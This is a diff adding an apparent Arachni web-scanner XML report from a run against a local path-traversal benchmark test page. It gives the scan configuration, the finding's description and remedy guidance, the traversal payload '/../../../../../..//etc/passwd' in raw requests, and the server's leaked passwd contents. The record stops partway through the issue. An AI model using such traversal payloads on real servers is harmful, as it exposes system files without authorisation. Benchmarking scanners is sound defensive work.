@@ -1,0 +1,808 @@
+<?xml version="1.0"?>
+<report xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://raw.githubusercontent.com/Arachni/arachni/v1.6.1.3/components/reporters/xml/schema.xsd">
+  <version>1.6.1.3</version>
+  <seed>b0e3e4422d66983deb98ca68d786ace8</seed>
+  <options>---
+browser_cluster:
+  local_storage: {}
+  session_storage: {}
+  wait_for_elements: {}
+  wait_for_timers: false
+  pool_size: 4
+  job_timeout: 60
+  worker_time_to_live: 250
+  ignore_images: false
+  screen_width: 1600
+  screen_height: 1200
+http:
+  user_agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3
+  request_timeout: 20000
+  request_redirect_limit: 5
+  request_concurrency: 10
+  request_queue_size: 50
+  request_headers: {}
+  response_max_size: 500000
+  cookies: {}
+  authentication_type: auto
+input:
+  values: {}
+  default_values:
+    name: arachni_name
+    user: arachni_user
+    usr: arachni_user
+    pass: 5543!%arachni_secret
+    txt: arachni_text
+    num: '132'
+    amount: '100'
+    mail: arachni@email.gr
+    account: '12'
+    id: '1'
+  without_defaults: false
+  force: false
+audit:
+  parameter_values: true
+  exclude_vector_patterns: []
+  include_vector_patterns: []
+  link_templates: []
+  links: true
+  forms: true
+  cookies: true
+  ui_inputs: true
+  ui_forms: true
+  jsons: true
+  xmls: true
+  nested_cookies: true
+scope:
+  directory_depth_limit: 10
+  auto_redundant_paths: 15
+  redundant_path_patterns: {}
+  dom_depth_limit: 4
+  exclude_file_extensions:
+  - gif
+  - bmp
+  - tif
+  - tiff
+  - jpg
+  - jpeg
+  - jpe
+  - pjpeg
+  - png
+  - ico
+  - psd
+  - xcf
+  - 3dm
+  - max
+  - svg
+  - eps
+  - drw
+  - ai
+  - asf
+  - rm
+  - mpg
+  - mpeg
+  - mpe
+  - 3gp
+  - 3g2
+  - avi
+  - flv
+  - mov
+  - mp4
+  - swf
+  - vob
+  - wmv
+  - aif
+  - mp3
+  - mpa
+  - ra
+  - wav
+  - wma
+  - mid
+  - m4a
+  - ogg
+  - flac
+  - zip
+  - zipx
+  - tar
+  - gz
+  - 7z
+  - rar
+  - bz2
+  - bin
+  - cue
+  - dmg
+  - iso
+  - mdf
+  - vcd
+  - raw
+  - exe
+  - apk
+  - app
+  - jar
+  - pkg
+  - deb
+  - rpm
+  - msi
+  - ttf
+  - otf
+  - woff
+  - woff2
+  - fon
+  - fnt
+  - css
+  - js
+  - pdf
+  - docx
+  - xlsx
+  - pptx
+  - odt
+  - odp
+  exclude_path_patterns: []
+  exclude_content_patterns: []
+  include_path_patterns: []
+  restrict_paths: []
+  extend_paths: []
+  url_rewrites: {}
+session: {}
+datastore:
+  report_path: "../dataset/ARACHNI/BenchmarkTest00629.afr"
+checks:
+- insecure_cross_domain_policy_access
+- backup_files
+- common_files
+- xst
+- origin_spoof_access_restriction_bypass
+- insecure_client_access_policy
+- captcha
+- http_only_cookies
+- insecure_cors_policy
+- credit_card
+- form_upload
+- html_objects
+- hsts
+- ssn
+- private_ip
+- x_frame_options
+- cookie_set_for_parent_domain
+- unencrypted_password_forms
+- mixed_resource
+- password_autocomplete
+- cvs_svn_users
+- insecure_cookies
+- emails
+- http_put
+- backup_directories
+- webdav
+- common_directories
+- directory_listing
+- interesting_responses
+- backdoors
+- localstart_asp
+- insecure_cross_domain_policy_headers
+- htaccess_limit
+- common_admin_interfaces
+- allowed_methods
+- code_injection_timing
+- code_injection_php_input_wrapper
+- no_sql_injection_differential
+- csrf
+- xss_tag
+- unvalidated_redirect_dom
+- session_fixation
+- xss_event
+- rfi
+- no_sql_injection
+- source_code_disclosure
+- path_traversal
+- sql_injection_timing
+- code_injection
+- trainer
+- os_cmd_injection
+- xss_dom_script_context
+- os_cmd_injection_timing
+- xss_path
+- xss_script_context
+- file_inclusion
+- ldap_injection
+- response_splitting
+- xpath_injection
+- xss
+- xxe
+- unvalidated_redirect
+- xss_dom
+- sql_injection_differential
+- sql_injection
+platforms: []
+plugins: {}
+no_fingerprinting: false
+authorized_by: 
+url: https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName
+</options>
+  <start_datetime>2025-05-29T03:13:48-07:00</start_datetime>
+  <finish_datetime>2025-05-29T03:13:59-07:00</finish_datetime>
+  <sitemap>
+    <entry url="https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName" code="200"/>
+  </sitemap>
+  <issues>
+    <issue>
+      <name>Path Traversal</name>
+      <description>
+Web applications occasionally use parameter values to store the location of a file
+which will later be required by the server.
+
+An example of this is often seen in error pages, where the actual file path for
+the error page is stored in a parameter value -- for example `example.com/error.php?page=404.php`.
+
+A path traversal occurs when the parameter value (ie. path to file being called
+by the server) can be substituted with the relative path of another resource which
+is located outside of the applications working directory. The server then loads
+the resource and includes its contents in the response to the client.
+
+Cyber-criminals will abuse this vulnerability to view files that should otherwise
+not be accessible.
+
+A very common example of this, on *nix servers, is gaining access to the `/etc/passwd`
+file in order to retrieve a list of server users. This attack would look like:
+`yoursite.com/error.php?page=../../../../etc/passwd`
+
+As path traversal is based on the relative path, the payload must first traverse
+to the file system's root directory, hence the string of `../../../../`.
+
+Arachni discovered that it was possible to substitute a parameter value with a
+relative path to a common operating system file and have the contents of the file
+included in the response.
+</description>
+      <remedy_guidance>
+It is recommended that untrusted data is never used to form a file location to
+be included.
+
+To validate data, the application should ensure that the supplied value for a file
+is permitted. This can be achieved by performing whitelisting on the parameter
+value, by matching it against a list of permitted files. If the supplied value
+does not match any value in the whitelist, then the server should redirect to a
+standard error page.
+
+In some scenarios, where dynamic content is being requested, it may not be possible
+to perform validation against a list of trusted resources, therefore the list must
+also become dynamic (updated as the files change), or perform filtering to remove
+extraneous user input (such as semicolons, periods etc.) and only permit `a-z0-9`.
+
+It is also advised that sensitive files are not stored within the web root and
+that the user permissions enforced by the directory are correct.
+</remedy_guidance>
+      <remedy_code/>
+      <severity>high</severity>
+      <check>
+        <name>Path Traversal</name>
+        <description>
+It injects paths of common files ( like `/etc/passwd` and `boot.ini`) and
+evaluates the existence of a path traversal vulnerability based on the presence
+of relevant content in the HTML responses.
+</description>
+        <author>Tasos "Zapotek" Laskos &lt;tasos.laskos@arachni-scanner.com&gt; </author>
+        <version>0.4.8</version>
+        <shortname>path_traversal</shortname>
+      </check>
+      <cwe>22</cwe>
+      <digest>538308827</digest>
+      <references>
+        <reference title="OWASP" url="https://www.owasp.org/index.php/Path_Traversal"/>
+        <reference title="WASC" url="http://projects.webappsec.org/Path-Traversal"/>
+      </references>
+      <vector>
+        <class>Arachni::Element::Link</class>
+        <type>link</type>
+        <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+        <action>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629</action>
+        <source/>
+        <seed>/../../../../../..//etc/passwd</seed>
+        <method>get</method>
+        <affected_input_name>BenchmarkTest00629</affected_input_name>
+        <inputs>
+          <input name="BenchmarkTest00629" value="/../../../../../..//etc/passwd"/>
+        </inputs>
+        <default_inputs>
+          <input name="BenchmarkTest00629" value="FileName"/>
+        </default_inputs>
+      </vector>
+      <remarks/>
+      <page>
+        <body>The beginning of file: '&amp;#x2f;home&amp;#x2f;huy&amp;#x2f;BenchmarkJava&amp;#x2f;target&amp;#x2f;tomcat9x&amp;#x2f;testfiles&amp;#x2f;&amp;#x2f;..&amp;#x2f;..&amp;#x2f;..&amp;#x2f;..&amp;#x2f;..&amp;#x2f;..&amp;#x2f;&amp;#x2f;etc&amp;#x2f;passwd' is:
+
+
+root&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&amp;#xa;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&amp;#xa;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;systemd-network&amp;#x3a;x&amp;#x3a;100&amp;#x3a;102&amp;#x3a;systemd Network Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;systemd-resolve&amp;#x3a;x&amp;#x3a;101&amp;#x3a;103&amp;#x3a;systemd Re
+</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629</url>
+          <method>get</method>
+          <parameters>
+            <parameter name="BenchmarkTest00629" value="/../../../../../..//etc/passwd"/>
+          </parameters>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="b0e3e4422d66983deb98ca68d786ace8"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc%2Fpasswd HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: b0e3e4422d66983deb98ca68d786ace8&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=/../../../../../..//etc/passwd</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0132</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Content-Type" value="text/html;charset=UTF-8"/>
+            <header name="Content-Length" value="2334"/>
+            <header name="Date" value="Thu, 29 May 2025 10:13:57 GMT"/>
+          </headers>
+          <body>The beginning of file: '&amp;#x2f;home&amp;#x2f;huy&amp;#x2f;BenchmarkJava&amp;#x2f;target&amp;#x2f;tomcat9x&amp;#x2f;testfiles&amp;#x2f;&amp;#x2f;..&amp;#x2f;..&amp;#x2f;..&amp;#x2f;..&amp;#x2f;..&amp;#x2f;..&amp;#x2f;&amp;#x2f;etc&amp;#x2f;passwd' is:
+
+
+root&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&amp;#xa;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&amp;#xa;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;systemd-network&amp;#x3a;x&amp;#x3a;100&amp;#x3a;102&amp;#x3a;systemd Network Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;systemd-resolve&amp;#x3a;x&amp;#x3a;101&amp;#x3a;103&amp;#x3a;systemd Re
+</body>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Content-Type: text/html;charset=UTF-8&#xD;
+Content-Length: 2334&#xD;
+Date: Thu, 29 May 2025 10:13:57 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=/../../../../../..//etc/passwd</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </page>
+      <referring_page>
+        <body>The beginning of file: '&amp;#x2f;home&amp;#x2f;huy&amp;#x2f;BenchmarkJava&amp;#x2f;target&amp;#x2f;tomcat9x&amp;#x2f;testfiles&amp;#x2f;FileName' is:
+
+
+Problem getting InputStream: offset 0, count -1, length 1000
+</body>
+        <request>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <method>get</method>
+          <parameters/>
+          <headers>
+            <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"/>
+            <header name="User-Agent" value="Mozilla/5.0 (Gecko) Arachni/v1.6.1.3"/>
+            <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6"/>
+            <header name="X-Arachni-Scan-Seed" value="b0e3e4422d66983deb98ca68d786ace8"/>
+          </headers>
+          <body/>
+          <raw>GET /benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName HTTP/1.1&#xD;
+Host: 192.168.6.149:8443&#xD;
+Accept-Encoding: gzip, deflate&#xD;
+User-Agent: Mozilla/5.0 (Gecko) Arachni/v1.6.1.3&#xD;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+X-Arachni-Scan-Seed: b0e3e4422d66983deb98ca68d786ace8&#xD;
+&#xD;
+</raw>
+        </request>
+        <response>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <code>200</code>
+          <ip_address>192.168.6.149</ip_address>
+          <time>0.0272</time>
+          <return_code>ok</return_code>
+          <return_message>No error</return_message>
+          <headers>
+            <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com"/>
+            <header name="Cache-Control" value="no-cache, no-store, must-revalidate"/>
+            <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains"/>
+            <header name="X-Frame-Options" value="DENY"/>
+            <header name="X-Content-Type-Options" value="nosniff"/>
+            <header name="Content-Type" value="text/html;charset=UTF-8"/>
+            <header name="Content-Length" value="186"/>
+            <header name="Date" value="Thu, 29 May 2025 10:13:54 GMT"/>
+          </headers>
+          <body>The beginning of file: '&amp;#x2f;home&amp;#x2f;huy&amp;#x2f;BenchmarkJava&amp;#x2f;target&amp;#x2f;tomcat9x&amp;#x2f;testfiles&amp;#x2f;FileName' is:
+
+
+Problem getting InputStream: offset 0, count -1, length 1000
+</body>
+          <raw_headers>HTTP/1.1 200 &#xD;
+Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+Cache-Control: no-cache, no-store, must-revalidate&#xD;
+Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+X-Frame-Options: DENY&#xD;
+X-Content-Type-Options: nosniff&#xD;
+Content-Type: text/html;charset=UTF-8&#xD;
+Content-Length: 186&#xD;
+Date: Thu, 29 May 2025 10:13:54 GMT&#xD;
+&#xD;
+</raw_headers>
+        </response>
+        <dom>
+          <url>https://192.168.6.149:8443/benchmark/pathtraver-00/BenchmarkTest00629?BenchmarkTest00629=FileName</url>
+          <transitions/>
+          <data_flow_sinks/>
+          <execution_flow_sinks/>
+        </dom>
+      </referring_page>
+      <signature>&amp;#x3a;.+&amp;#x3a;\d+&amp;#x3a;\d+&amp;#x3a;.+&amp;#x3a;[0-9a-zA-Z&amp;#;]+</signature>
+      <proof>&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&amp;#xa;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&amp;#xa;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;var&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;systemd-network&amp;#x3a;x&amp;#x3a;100&amp;#x3a;102&amp;#x3a;systemd Network Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&amp;#xa;systemd-resolve&amp;#x3a;x&amp;#x3a;101&amp;#x3a;103&amp;#x3a;systemd</proof>
